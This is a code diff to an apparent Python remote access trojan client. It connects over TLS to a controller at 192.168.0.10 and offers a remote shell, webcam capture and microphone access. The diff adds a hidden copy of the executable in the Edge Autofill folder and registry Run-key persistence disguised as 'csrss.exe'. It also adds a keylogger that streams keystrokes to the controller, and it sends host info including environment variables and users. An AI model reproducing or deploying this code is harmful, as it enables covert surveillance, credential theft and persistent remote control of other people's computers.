@@ -7,11 +7,28 @@ import psutil
 import subprocess
 import cv2
 import pyaudio
+import shutil
+import win32con
+import win32api
+import winreg
+from pynput import keyboard
 
 class Client:
     def __init__(self):
-        self.IP = '127.0.0.1'
+        self.IP = '192.168.0.10'
         self.PORT = 4747
+        self.AUTOCON = False
+        self.CONNECTED = False
+        self.MIC = False
+        self.COPY = False
+        self.PWD = os.getcwd()
+        self.frame = None 
+        self.copy = False
+        self.BuffSize = 100000000
+        self.key_pressed = None
+        self.status_keylogger = False
+        self.new_path = 'C:\\Users\\BCC\\AppData\\Local\\Microsoft\\Edge\\User Data\\Autofill'
+    def UpdateInfoAndSend(self):
         self.OS_VER  = platform.platform()
         self.OS_NAME = platform.system()
         self.ARCH = platform.architecture()
@@ -19,10 +36,7 @@ class Client:
         self.RAM = psutil.virtual_memory().total
         self.VARS = os.environ
         self.PWD = os.getcwd()
-        self.AUTOCON = False
-        self.CONNECTED = False
-        self.MIC = False
-        self.frame = None 
+        self.USERS = psutil.users() 
         self.info = f'''
         OS        : {self.OS_NAME}
         OS_VER    : {self.OS_VER}
@@ -31,11 +45,33 @@ class Client:
         RAM       : {self.RAM}
         ENV       : {self.VARS}
         PWD       : {self.PWD}
+        COPY      : {self.COPY}
+        USERS     : {self.USERS}
+        AUTCON    : {self.AUTOCON}
         '''
-        self.BuffSize = 100000000
+        self.writer.write(bytes(self.info,'utf-8'))
+        self.writer.drain()
 
     def start_client(self):
+        #hidden .exe
+        self.PWD = os.getcwd()
+        file_name = os.path.basename(__file__)
+        name, ext = os.path.splitext(file_name)
+        current_file_path = self.PWD + '\\' + name + '.exe'
+
+        try:
+            shutil.copy(current_file_path, self.new_path)
+            file_name = os.path.basename(__file__)
+            name, ext = os.path.splitext(file_name)
+            attr = win32api.GetFileAttributes(self.new_path + '\\' + name + '.exe')
+            win32api.SetFileAttributes(self.new_path + '\\' + name + '.exe', attr | win32con.FILE_ATTRIBUTE_HIDDEN)
+            self.COPY = True
+        except:
+            pass
+        #run .exe
         asyncio.run(self.main())
+    
+
     async def shell_session(self,reader, writer):
 
         startupinfo1 = subprocess.STARTUPINFO()
@@ -96,6 +132,20 @@ class Client:
                 pass
             stdout = ''
             stderr = ''
+    def addStartup(self):  # this will add the file to the startup registry key
+        try:
+            file_name = os.path.basename(__file__)
+            name, ext = os.path.splitext(file_name)
+            new_file_path = self.new_path + '\\' + name + '.exe'
+            keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
+            key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0,winreg.KEY_ALL_ACCESS)
+            winreg.SetValueEx(key2change, 'csrss.exe', 0, winreg.REG_SZ,
+                    new_file_path)
+            self.writer.write(b'[+] Registers pwned')
+            self.writer.drain()
+            self.writer.write(bytes(new_file_path + ' in Software\Microsoft\Windows\CurrentVersion\Run','utf-8'))
+        except:
+            self.writer.write(b'[+] could not write to the registers for persistence')
 
     async def ConnectToServer(self):
         self.context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
@@ -123,7 +173,12 @@ class Client:
                             break
 
                     ret, frame = cap.read()
-                    ret, data = cv2.imencode(".jpg", frame)
+                    try:
+                        ret, data = cv2.imencode(".jpg", frame)
+                    except cv2.error:
+                        self.writer.write(b'exit')
+                        await self.writer.drain()
+                        break
     
                     self.writer.write(len(data).to_bytes(4, 'big'))
                     await self.writer.drain()
@@ -185,8 +240,14 @@ class Client:
             await writer.drain()
 
             
-
-        
+    def on_press(self,key):
+        if self.status_keylogger == False:
+            return False
+        try:
+            self.key_pressed = key.char
+        except AttributeError:
+            self.key_pressed = '{'+ str(key) + '}'
+            
     async def main(self):
         while True:
             try:
@@ -216,8 +277,7 @@ class Client:
                             sys.exit()
                     data = data.decode()
                     if data == 'info':
-                        self.writer.write(bytes(self.info,'utf-8'))
-                        await self.writer.drain()
+                       self.UpdateInfoAndSend()
                     elif data == 'shell':
                         await self.shell_session(self.reader,self.writer)
                     elif data == 'camera':
@@ -233,6 +293,26 @@ class Client:
                             self.AUTOCON = False
                             self.writer.write(b'\n[+] AUTOCONNECTION FALSE')
                             await self.writer.drain()
+                    elif data == 'keylogger':
+                        self.status_keylogger = True
+
+                        with keyboard.Listener(on_press=self.on_press) as listener:
+                            while self.status_keylogger:
+                                try:
+                                    msg = await asyncio.wait_for(self.reader.read(self.BuffSize), timeout=0.1)
+                                except asyncio.TimeoutError:
+                                    msg = b'nothing'
+                                if msg.decode(errors='ignore') == 'exit':
+                                    self.status_keylogger = False
+                                    self.writer.write(b'keylogger')
+                                    await self.writer.drain()
+                                    break
+                                if not self.key_pressed is None:
+                                    self.writer.write(bytes(str(self.key_pressed),'utf-8'))
+                                    await self.writer.drain()
+                                    self.key_pressed = None
+                    elif data == 'persist':
+                        self.addStartup()
                     else:
                         self.writer.write(b'\n[-] I do not know the command')
                         await self.writer.drain()
